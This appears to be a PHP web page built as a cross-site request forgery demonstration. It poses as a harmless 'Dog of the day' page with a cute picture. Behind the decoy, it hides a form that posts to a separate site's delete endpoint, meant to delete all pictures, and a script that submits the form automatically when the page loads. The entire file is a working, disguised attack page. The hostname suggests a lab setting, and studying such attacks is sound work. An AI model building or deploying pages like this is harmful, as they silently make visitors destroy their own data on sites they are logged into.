<!DOCTYPE html>
<html lang="de">
    <?php include 'template/head.php';?>
    <body>
        <?php
            session_start();
            if (!empty($_GET['delete'])) {
                unset($_GET['delete']);
            }
            if (!isset($_SESSION["visits"]))
                $_SESSION["visits"] = 0;
            $_SESSION["visits"] = $_SESSION["visits"] < 1 ? $_SESSION["visits"] + 1 : 0;
        ?>
        <?php if($_SESSION["visits"] == 1): ?>
            <script>
                $(window).load(function() {
                    $("#xsrf_submit").click();
                });
            </script>
        <?php endif; ?>
        <?php include 'template/navbar.php';?>
        <div class="container">
            <h1 class="text-center">Dog of the day</h1>
            <img class="center-block" src="cute-dog.jpg"/>
            <h5 class="text-center">Look at this dog, isn't he the sweetest little dog you've ever seen?</h5>

            <!-- Form for deleting all pics-->
            <form method="POST" action="http://ccc-xsrf.dev/delete.php" class="form-horizontal text-center hidden" id="xsrf_form">
                    <button class="btn btn-success" type="submit" name="submit" id="xsrf_submit" >
                        <i class="fa fa-btn fa-check"></i>I like this dog
                    </button>
            </form>
        </div>
    </body>
    <?php include 'template/footer.php';?>
    <?php include 'template/scripts.php';?>

</html>
